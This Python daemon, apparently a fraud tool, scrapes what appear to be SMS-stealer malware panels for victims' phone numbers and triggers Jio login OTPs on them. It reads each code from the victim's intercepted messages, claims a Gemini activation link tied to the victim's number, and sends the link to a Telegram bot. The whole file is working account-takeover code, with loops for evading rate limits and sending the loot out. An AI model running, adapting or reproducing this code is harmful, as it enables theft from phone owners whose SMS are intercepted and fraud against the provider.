"""Jio Gemini hunter daemon. Loop: pool numbers from live panels -> keep valid Jio
-> sendOtp (IP-cooldown aware) -> read OTP from panel -> activation link -> Telegram."""
from __future__ import annotations
import sys, time, re, json, subprocess
from pathlib import Path
import requests

sys.path.insert(0, str(Path(__file__).parent))
from jio import (latest_messages, number_candidates, device_own_number, jio_session, is_jio_number,
                 verify_otp, get_activation, save_link,
                 OTP_WORD_PATTERN, OTP_PATTERN, message_order, SEND_OTP_URL)

from config import TG_TOKEN, TG_CHAT, TARGET_COUNT, SEND_GAP, OTP_WAIT, LOCK_COOLDOWN, PANELS_FILE

UA = {"Accept": "application/json", "User-Agent": "Mozilla/5.0"}
SENT = Path("sent_links.txt")
PENDING = Path("pending_tg.txt")     # links whose Telegram send failed; retried at start
CLAIMED = Path("claimed_nums.txt")   # numbers that already produced a link
LOCK_FILE = Path("locked_nums.json")   # {num: unix_ts_until_lock}

BASES = None


def tg(text: str) -> bool:
    """Send to Telegram via curl (happy-eyeballs; requests hangs on a dead family)."""
    for attempt in range(3):
        try:
            r = subprocess.run(
                ["curl", "-s", "--max-time", "25", "-o", "/dev/null", "-w", "%{http_code}",
                 f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                 "--data-urlencode", f"chat_id={TG_CHAT}",
                 "--data-urlencode", f"text={text}"],
                capture_output=True, text=True, timeout=30)
            if r.stdout.strip() == "200":
                return True
            print(f"    tg fail: http={r.stdout.strip()} {r.stderr[:80]}", flush=True)
        except Exception as e:
            print(f"    tg err: {e}", flush=True)
        time.sleep(3)
    return False


def live_bases() -> list[str]:
    p = PANELS_FILE if PANELS_FILE.exists() else (Path("panels.txt") if Path("panels.txt").exists() else Path("probed_live.txt"))
    if not p.exists():
        return []
    return sorted(set(l.strip() for l in p.read_text().splitlines() if l.strip().startswith("http")))


def _pool_one(base: str) -> list[tuple[str, str, str]]:
    s = requests.Session(); s.headers.update(UA)
    out = []
    now = time.time() * 1000
    try:
        cl = s.get(f"{base}/clients.json", timeout=6).json()
    except Exception:
        return out
    if not isinstance(cl, dict):
        return out
    # ponytail: cap devices/panel; big panels (300+) otherwise stall the whole round
    for dev, c in list(cl.items())[:80]:
        # skip devices that report offline — saves a 20s request each
        if isinstance(c, dict) and c.get("status") is False:
            continue
        try:
            m = latest_messages(s, base, base, dev, 100, timeout=7)
        except Exception:
            continue
        st = isinstance(c, dict) and c.get("status") is True
        keys = [int(k) for k in m if str(k).isdigit()]
        recent = bool(keys) and (now - max(keys)) < 15 * 60 * 1000
        if not (st or recent):
            continue
        # only the device's OWN SIM number — OTPs only land on that device
        own = device_own_number(m)
        if own:
            out.append((base, dev, own))
    return out


def pool(s: requests.Session) -> list[tuple[str, str, str]]:
    """[(base, dev, num)] for every candidate across live panels — parallel per panel."""
    import concurrent.futures as cf
    out = []
    with cf.ThreadPoolExecutor(max_workers=16) as ex:
        for res in ex.map(_pool_one, live_bases()):
            out.extend(res)
    return out


def read_otp(fb, base, dev, known, jio, mobile, wait):
    deadline = time.monotonic() + wait
    tick = 0
    while time.monotonic() < deadline:
        tick += 1
        print(f"    waiting otp {tick}/{wait // 2}", flush=True)  # heartbeat: keeps log moving
        try:
            m = latest_messages(fb, base, base, dev, 40, timeout=8)
        except requests.RequestException:
            time.sleep(2); continue
        cands = []
        for k, v in m.items():
            if k in known:
                continue
            b = str(v.get("message", ""))
            if not OTP_WORD_PATTERN.search(b):
                continue
            mm = OTP_PATTERN.search(b)
            if mm:
                cands.append((message_order(k, v), k, mm.group(1)))
        if cands:
            cands.sort()
            _, k, otp = cands[-1]
            known.add(k)
            if verify_otp(jio, mobile, otp):
                return otp
        time.sleep(2)
    return None


def send_otp_code(jio, mobile):
    try:
        r = jio.post(SEND_OTP_URL, json={"mobileNumber": mobile, "loginFlowType": "MOBILE",
                                         "alternateNumber": ""}, timeout=15)
    except requests.RequestException:
        return "err"
    if r.status_code == 200:
        return "ok"
    try:
        return r.json().get("errorMessage", str(r.status_code))
    except ValueError:
        return str(r.status_code)


def device_active(s: requests.Session, base: str, dev: str) -> bool:
    """True if device likely forwarding now: status True or a message in last 15 min."""
    try:
        c = s.get(f"{base}/clients/{dev}.json", timeout=12).json()
    except (requests.RequestException, ValueError):
        c = None
    if isinstance(c, dict) and c.get("status") is True:
        return True
    try:
        m = latest_messages(s, base, base, dev, 5, timeout=8)
    except requests.RequestException:
        return False
    keys = [int(k) for k in m if str(k).isdigit()]
    return bool(keys) and (time.time() * 1000 - max(keys)) < 15 * 60 * 1000


def main() -> int:
    s = requests.Session(); s.headers.update(UA)
    jio = jio_session()
    sent = set(SENT.read_text().splitlines()) if SENT.exists() else set()
    claimed = set(CLAIMED.read_text().split()) if CLAIMED.exists() else set()
    locks = json.loads(LOCK_FILE.read_text()) if LOCK_FILE.exists() else {}
    shipped = 0          # fresh links sent THIS session (TARGET_COUNT gate)
    rnd = 0

    # flush links whose earlier Telegram send failed
    if PENDING.exists():
        todo = PENDING.read_text().split()
        left = []
        for u in todo:
            if tg(f"JACKPOT jio gemini (retry)\n{u}"):
                print(f"    pending sent: {u[:60]}", flush=True)
            else:
                left.append(u)
        if left:
            PENDING.write_text("\n".join(left) + "\n")
        else:
            PENDING.unlink(missing_ok=True)
        if todo:
            print(f"[pending] {len(todo)} flushed, {len(left)} still queued", flush=True)
    while True:
        rnd += 1
        cands = pool(s)
        # unique, prefer numbers tied to a device that recently received sms
        uniq = {}
        for base, dev, n in cands:
            uniq.setdefault(n, (base, dev))
        print(f"[r{rnd}] candidates={len(cands)} unique={len(uniq)} claimed={len(claimed)} sent={len(sent)}", flush=True)
        attempted_lock = False
        for n, (base, dev) in uniq.items():
            if n in claimed:
                continue
            if n in locks and time.time() < locks[n]:
                continue
            print(f"  try {n} @ {dev[:12]}", flush=True)
            if not device_active(s, base, dev):
                print("    device idle, skip", flush=True)
                continue
            if not is_jio_number(jio, n):
                # ponytail: skip log line per user preference
                continue
            fb = requests.Session(); fb.headers.update(UA)
            try:
                known = set(latest_messages(fb, base, base, dev, 200, timeout=8))
            except Exception:
                continue
            code = send_otp_code(jio, n)
            print(f"    sendOtp: {code}", flush=True)
            if code != "ok":
                if "LOCK" in code or "CAPTCHA" in code or "429" in code:
                    locks[n] = time.time() + LOCK_COOLDOWN
                    attempted_lock = True
                time.sleep(5)
                continue
            otp = read_otp(fb, base, dev, known, jio, n, OTP_WAIT)
            print(f"    otp: {otp}", flush=True)
            if not otp:
                continue
            status, url = get_activation(jio)
            print(f"    {status} {url if url else ''}", flush=True)
            # ponytail: only claim on terminal outcome; retry transient failures next round
            TERMINAL = {"activation_url_found", "already_active"}
            if status not in TERMINAL:
                time.sleep(SEND_GAP)
                continue
            claimed.add(n)
            with CLAIMED.open("a") as fh:
                fh.write(n + "\n")
            if url and url not in sent:
                sent.add(url)
                with SENT.open("a") as fh:
                    fh.write(url + "\n")
                save_link(url)
                stamp = time.strftime("%H:%M:%S %d/%m")
                ok = tg(f"JACKPOT jio gemini\n[{stamp}]\nnum: {n}\nstatus: {status}\n{url}")
                if ok:
                    shipped += 1
                    print(f"    SENT telegram (session={shipped}, total={len(sent)})", flush=True)
                else:
                    with PENDING.open("a") as fh:
                        fh.write(url + "\n")
                    print(f"    tg FAILED, queued to {PENDING.name}", flush=True)
                if len(sent) >= TARGET_COUNT:
                    LOCK_FILE.write_text(json.dumps(locks))
                    return 0
            LOCK_FILE.write_text(json.dumps(locks))
            time.sleep(SEND_GAP)
        LOCK_FILE.write_text(json.dumps(locks))
        print(f"[r{rnd}] pass done, sleep", flush=True)
        time.sleep(180 if attempted_lock else 60)


if __name__ == "__main__":
    raise SystemExit(main())